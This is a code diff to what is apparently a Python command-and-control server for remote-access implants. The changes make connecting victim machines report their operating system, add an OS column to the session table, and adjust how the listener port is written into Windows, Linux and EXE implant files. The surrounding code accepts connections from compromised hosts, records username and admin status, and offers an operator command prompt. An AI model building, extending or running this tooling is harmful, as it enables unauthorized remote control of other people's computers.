@@ -78,6 +78,7 @@ def comm_handler():
             remote_target, remote_ip = sock.accept()
             username = remote_target.recv(1024).decode()
             admin = remote_target.recv(1024).decode()
+            opsys = remote_target.recv(1024).decode()
             if admin == 1:
                 admin_val = 'Yes'
             elif username == 'root':
@@ -89,10 +90,10 @@ def comm_handler():
             time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
             host_name = socket.gethostbyaddr(remote_ip[0])
             if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val])
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, opsys])
                 print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Command > ', end="")
             else:
-                targets.append([remote_target, remote_ip[0], time_record])
+                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, opsys])
                 print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Command > ', end="")
         except:
             pass
@@ -112,7 +113,7 @@ def winplant():
         file.write(new_host)
         file.close()
     with open(file_name) as file:
-        new_port = file.read().replace('INPUT_PORT_HERE', host_port)
+        new_port = file.read().replace("'INPUT_PORT_HERE'", host_port)
     with open (file_name, 'w') as file:
         file.write(new_port)
         file.close()
@@ -136,7 +137,7 @@ def linplant():
         file.write(new_host)
         file.close()
     with open(file_name) as file:
-        new_port = file.read().replace('INPUT_PORT_HERE', host_port)
+        new_port = file.read().replace("'INPUT_PORT_HERE'", host_port)
     with open (file_name, 'w') as file:
         file.write(new_port)
         file.close()
@@ -161,7 +162,7 @@ def exeplant():
         file.write(new_host)
         file.close()
     with open(file_name) as file:
-        new_port = file.read().replace('INPUT_PORT_HERE', host_port)
+        new_port = file.read().replace("'INPUT_PORT_HERE'", host_port)
     with open (file_name, 'w') as file:
         file.write(new_port)
         file.close()
@@ -212,10 +213,10 @@ if __name__ == '__main__':
                 session_counter = 0
                 if command.split(" ")[1] == '-l':
                     myTable = PrettyTable()
-                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Session Start Time']
+                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Operating System', 'Session Start Time']
                     myTable.padding_width = 3
                     for target in targets:
-                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[2]])
+                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[5], target[2]])
                         session_counter += 1
                     print (myTable)
                 if command.split(" ")[1] == '-i':
